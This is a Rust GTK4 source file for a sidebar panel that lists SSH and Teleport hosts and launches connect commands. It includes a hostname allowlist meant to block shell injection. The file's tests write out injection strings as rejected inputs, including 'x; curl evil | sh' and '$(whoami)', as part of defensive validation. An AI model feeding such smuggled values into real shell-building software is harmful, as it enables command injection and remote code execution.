use gtk4::prelude::*;
use std::cell::Cell;
use std::rc::Rc;

/// Sidebar panel listing connectable hosts: `Host` entries from
/// ~/.ssh/config and Teleport nodes from `tsh ls`. Activating a row opens a
/// new tab running the row's connect command (stored in the widget name).
pub struct HostsPanel {
    pub widget: gtk4::Box,
    pub list: gtk4::ListBox,
    pub refresh_btn: gtk4::Button,
    show_teleport: Rc<Cell<bool>>,
}

enum Item {
    Header(String),
    Host { name: String, command: String },
    Message(String),
}

pub fn build(show_teleport: bool) -> HostsPanel {
    let widget = gtk4::Box::new(gtk4::Orientation::Vertical, 0);

    let header_row = gtk4::Box::new(gtk4::Orientation::Horizontal, 0);
    let header = gtk4::Label::new(Some("HOSTS"));
    header.add_css_class("sidebar-header");
    header.set_xalign(0.0);
    header.set_hexpand(true);
    header_row.append(&header);

    let refresh_btn = gtk4::Button::from_icon_name("view-refresh-symbolic");
    refresh_btn.add_css_class("run-btn");
    refresh_btn.set_tooltip_text(Some("Refresh hosts"));
    refresh_btn.set_margin_end(8);
    header_row.append(&refresh_btn);
    widget.append(&header_row);

    let list = gtk4::ListBox::new();
    list.set_selection_mode(gtk4::SelectionMode::None);
    list.add_css_class("quickopen-list");
    list.set_margin_start(4);
    list.set_margin_end(4);

    let scroll = gtk4::ScrolledWindow::new();
    scroll.set_child(Some(&list));
    scroll.set_hscrollbar_policy(gtk4::PolicyType::Never);
    scroll.set_vscrollbar_policy(gtk4::PolicyType::Automatic);
    scroll.set_vexpand(true);
    widget.append(&scroll);

    let panel = HostsPanel {
        widget,
        list,
        refresh_btn,
        show_teleport: Rc::new(Cell::new(show_teleport)),
    };
    panel.refresh();
    {
        let list = panel.list.clone();
        let show = Rc::clone(&panel.show_teleport);
        panel.refresh_btn.connect_clicked(move |_| {
            refresh_list(&list, show.get());
        });
    }
    panel
}

impl HostsPanel {
    pub fn refresh(&self) {
        refresh_list(&self.list, self.show_teleport.get());
    }

    /// Enable or disable the Teleport section. When disabled, tsh is never
    /// invoked at all. Refreshes the list when the value changes.
    pub fn set_show_teleport(&self, show: bool) {
        if self.show_teleport.replace(show) != show {
            self.refresh();
        }
    }
}

/// Gather hosts on a worker thread, then rebuild the list on the main loop.
fn refresh_list(list: &gtk4::ListBox, show_teleport: bool) {
    let (tx, rx) = async_channel::bounded::<Vec<Item>>(1);
    std::thread::spawn(move || {
        let mut items = Vec::new();

        items.push(Item::Header("SSH".to_string()));
        let ssh_hosts = std::env::var("HOME")
            .ok()
            .and_then(|home| std::fs::read_to_string(format!("{home}/.ssh/config")).ok())
            .map(|content| parse_ssh_config(&content))
            .unwrap_or_default();
        if ssh_hosts.is_empty() {
            items.push(Item::Message("No hosts in ~/.ssh/config".to_string()));
        }
        for host in ssh_hosts {
            if !is_safe_host(&host) {
                continue;
            }
            items.push(Item::Host {
                command: format!("ssh {host}"),
                name: host,
            });
        }

        if show_teleport {
            items.push(Item::Header("TELEPORT".to_string()));
            match teleport_nodes() {
                Ok(nodes) if nodes.is_empty() => {
                    items.push(Item::Message("No teleport nodes".to_string()));
                }
                Ok(nodes) => {
                    for node in nodes {
                        if !is_safe_host(&node.name) {
                            continue;
                        }
                        items.push(Item::Host {
                            name: node.name,
                            command: node.command,
                        });
                    }
                }
                Err(message) => items.push(Item::Message(message)),
            }
        }

        let _ = tx.send_blocking(items);
    });

    let list = list.clone();
    glib::spawn_future_local(async move {
        if let Ok(items) = rx.recv().await {
            populate(&list, &items);
        }
    });
}

pub struct TeleportNode {
    pub name: String,
    pub command: String,
}

/// Teleport nodes from `tsh ls --format=json`, or a short status message.
fn teleport_nodes() -> Result<Vec<TeleportNode>, String> {
    let output = std::process::Command::new("tsh")
        .args(["ls", "--format=json"])
        .output()
        .map_err(|_| "tsh not installed".to_string())?;
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        let first = stderr.lines().next().unwrap_or("tsh ls failed");
        return Err(format!("tsh: {first}"));
    }
    let nodes: serde_json::Value =
        serde_json::from_slice(&output.stdout).map_err(|_| "tsh: bad output".to_string())?;
    Ok(parse_teleport_nodes(&nodes))
}

/// (display name, connect command) for each node. Beam instances list as
/// nodes with a beam-<uuid> hostname that `tsh ssh` can't dial — they carry
/// a friendly alias in their labels and connect via `tsh beams ssh`.
fn parse_teleport_nodes(nodes: &serde_json::Value) -> Vec<TeleportNode> {
    let mut out: Vec<TeleportNode> = nodes
        .as_array()
        .map(|arr| {
            arr.iter()
                .filter_map(|n| {
                    if let Some(alias) =
                        n["metadata"]["labels"]["teleport.internal/beams/alias"].as_str()
                    {
                        return Some(TeleportNode {
                            name: alias.to_string(),
                            command: format!("tsh beams ssh {alias}"),
                        });
                    }
                    let hostname = n["spec"]["hostname"]
                        .as_str()
                        .or_else(|| n["metadata"]["name"].as_str())?;
                    Some(TeleportNode {
                        name: hostname.to_string(),
                        command: format!("tsh ssh {hostname}"),
                    })
                })
                .collect()
        })
        .unwrap_or_default();
    out.sort_by(|a, b| a.name.cmp(&b.name));
    out.dedup_by(|a, b| a.name == b.name);
    out
}

/// Hostnames we are willing to interpolate into a shell command. Conservative
/// allowlist: letters, digits, and the punctuation that appears in real host
/// aliases / Teleport node names. Anything else is dropped to avoid command
/// injection when the row is activated (the command is fed to a shell).
pub fn is_safe_host(name: &str) -> bool {
    !name.is_empty()
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '@'))
}

/// `Host` aliases from ssh config text, skipping wildcard and negated
/// patterns. `Match` blocks and `Include` directives are ignored.
pub fn parse_ssh_config(content: &str) -> Vec<String> {
    let mut hosts = Vec::new();
    for line in content.lines() {
        let line = line.trim();
        let Some(rest) = line
            .strip_prefix("Host ")
            .or_else(|| line.strip_prefix("host "))
        else {
            continue;
        };
        for name in rest.split_whitespace() {
            if name.contains(['*', '?']) || name.starts_with('!') {
                continue;
            }
            if !hosts.contains(&name.to_string()) {
                hosts.push(name.to_string());
            }
        }
    }
    hosts
}

fn populate(list: &gtk4::ListBox, items: &[Item]) {
    while let Some(row) = list.row_at_index(0) {
        list.remove(&row);
    }
    for item in items {
        let row = gtk4::ListBoxRow::new();
        match item {
            Item::Header(text) => {
                let label = gtk4::Label::new(Some(text));
                label.add_css_class("git-section-header");
                label.set_xalign(0.0);
                label.set_margin_start(8);
                label.set_margin_top(8);
                label.set_margin_bottom(2);
                row.set_child(Some(&label));
                row.set_activatable(false);
            }
            Item::Message(text) => {
                let label = gtk4::Label::new(Some(text));
                label.add_css_class("quickopen-path");
                label.set_xalign(0.0);
                label.set_margin_start(12);
                label.set_wrap(true);
                row.set_child(Some(&label));
                row.set_activatable(false);
            }
            Item::Host { name, command } => {
                let hbox = gtk4::Box::new(gtk4::Orientation::Horizontal, 8);
                hbox.set_margin_top(3);
                hbox.set_margin_bottom(3);
                hbox.set_margin_start(12);
                hbox.set_margin_end(8);
                let label = gtk4::Label::new(Some(name));
                label.add_css_class("quickopen-name");
                label.set_xalign(0.0);
                label.set_hexpand(true);
                label.set_ellipsize(pango::EllipsizeMode::End);
                hbox.append(&label);
                row.set_child(Some(&hbox));
                row.set_widget_name(command);
                row.set_activatable(true);
            }
        }
        list.append(&row);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parses_host_aliases() {
        let config = "Host dev\n  HostName dev.example.com\n\nHost web db\n  User admin\n";
        assert_eq!(parse_ssh_config(config), vec!["dev", "web", "db"]);
    }

    #[test]
    fn skips_wildcards_and_negations() {
        let config = "Host *\n  Compression yes\nHost prod-* !bastion dev?\nHost real\n";
        assert_eq!(parse_ssh_config(config), vec!["real"]);
    }

    #[test]
    fn skips_non_host_lines_and_dedupes() {
        let config = "# Host commented\nHostName not-a-host\nHost a\nHost a\n";
        assert_eq!(parse_ssh_config(config), vec!["a"]);
    }

    #[test]
    fn parses_plain_and_beam_nodes() {
        let json = serde_json::json!([
            {"spec": {"hostname": "web-1"}, "metadata": {"labels": {"env": "prod"}}},
            {"spec": {"hostname": "beam-3f2a"}, "metadata": {"labels": {"teleport.internal/beams/alias": "my-beam"}}},
        ]);
        let nodes = parse_teleport_nodes(&json);
        assert_eq!(nodes.len(), 2);
        // Sorted by name: my-beam, web-1.
        assert_eq!(nodes[0].name, "my-beam");
        assert_eq!(nodes[0].command, "tsh beams ssh my-beam");
        assert_eq!(nodes[1].name, "web-1");
        assert_eq!(nodes[1].command, "tsh ssh web-1");
    }

    #[test]
    fn teleport_nodes_fall_back_to_metadata_name_and_dedupe() {
        let json = serde_json::json!([
            {"metadata": {"name": "named-only"}},
            {"spec": {"hostname": "dup"}},
            {"spec": {"hostname": "dup"}},
            {"spec": {}},
        ]);
        let nodes = parse_teleport_nodes(&json);
        let names: Vec<&str> = nodes.iter().map(|n| n.name.as_str()).collect();
        assert_eq!(names, vec!["dup", "named-only"]);
    }

    #[test]
    fn rejects_unsafe_host_names() {
        assert!(is_safe_host("dev"));
        assert!(is_safe_host("db.example.com"));
        assert!(is_safe_host("user@host-1"));
        assert!(!is_safe_host("x; curl evil | sh"));
        assert!(!is_safe_host("a b"));
        assert!(!is_safe_host("$(whoami)"));
        assert!(!is_safe_host(""));
    }
}
